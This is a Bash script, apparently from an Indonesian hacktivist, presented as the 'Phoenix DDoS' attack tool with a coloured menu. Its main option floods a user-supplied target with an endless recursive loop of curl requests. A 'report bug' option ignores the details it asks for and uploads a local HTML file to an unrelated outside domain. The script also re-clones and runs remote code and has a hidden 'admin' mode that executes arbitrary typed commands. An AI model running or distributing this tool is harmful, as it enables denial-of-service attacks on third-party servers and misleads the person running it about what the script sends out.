#usr/bin/bash
bi='\033[34;1m' #biru
i='\033[32;1m' #ijo
pur='\033[35;1m' #purple
cy='\033[36;1m' #cyan
me='\033[31;1m' #merah
pu='\033[37;1m' #putih
ku='\033[33;1m' #kuning
# Jangan Recode Ya gayn
# yang Recode Besok  Mati Amin
clear
echo $ku
echo "___  _  _ ____ ____ _  _ _ _  _    ___  ___  ____ ____ 
|__] |__| |  | |___ |\ | |  \/     |  \ |  \ |  | [__  
|    |  | |__| |___ | \| | _/\_    |__/ |__/ |__| ___] 
"
echo $me              "███████"
echo $pu              "███████"
echo " "
echo $me"Indo"$pu"nesia" "$i"Hacktivist
echo "$i"By: "$ku"꧁ʀᴏɴɪᴢ꧂⁩
echo $pur
echo $pur"[ 1 ]" "$ku"START DDOS
echo $pur"[ 2 ]" "$ku"CHECK IP
echo $pur"[ 3 ]" "$ku"UPDATE
echo $pur"[ 4 ]" "$ku"REPORT BUG
echo $pur"[ 0 ]" "$me"KELUAR
echo $i
read -p "Choose: " ddos

if [ $ddos = 1 ] || [ $ddos = 01 ]
then
clear
echo "$pu"Masukan "$i"IP "$me"Target"$bi"
read -p "--> " target
echo $pur
echo $i"$target" "$me"Starting..... 
sleep 2
echo " "
phoe(){
echo $ku"Phoenix" $i"Attacking Server" "$me""[ "$pur"$target "$me"]--> "$cy"DDOS"
curl -s -Y 500 $target
sleep 0.03
echo " "
phoe
}
phoe
fi

if [ $ddos = 2 ] || [ $ddos = 02 ]
then
read -p "Website: " ping
ping -c 1 $ping
echo $i"Kami Memberi Waktu 5 Detik Untuk Mencopy"$me" IP"$i" nya"
sleep 5
clear
sh phoenix.sh
fi

if [ $ddos = 3 ] || [ $ddos = 03 ]
then
clear
echo $i"Updating......"
sleep 1
cd
cd $HOME
rm -f -r phoenix_ddos
git clone https://github.com/Mr-R0N1Z/phoenix_ddos
cd phoenix_ddos
sh phoenix.sh
fi

if [ $ddos = 4 ] || [ $ddos = 04 ]
then
echo $me
figlet REPORT BUG
echo $ku
sleep 1
echo $pur"Your Username? "$bi
read -p "Username: " namalu
echo $bi
echo $pur"Type The Problem? "
read -p "--> " cht
curl -T defron.html http://windmillsandporcupines.co.za
echo " "
echo $i"REPORTED [ ! ]"
echo " "
read -p "[ ENTER ] FOR CLOSE" asiap
sh phoenix.sh
fi

if [ $ddos = 0 ] || [ $ddos = 00 ]
then
clear
echo $me
figlet Thanks
echo "Terimakasih Telah Menggunakan Script ini"
sleep 1
fi

if [ $ddos = ADMIN ] || [ $ddos = admin ]
then
echo " "
echo "$ku"SELAMAT DATANG KEMBALI"$me" RONIZ
sleep 1
echo " "
xdsz(){
read -p "admin@niz:~# " admo
$admo
echo $me
xdsz
}
xdsz
fi
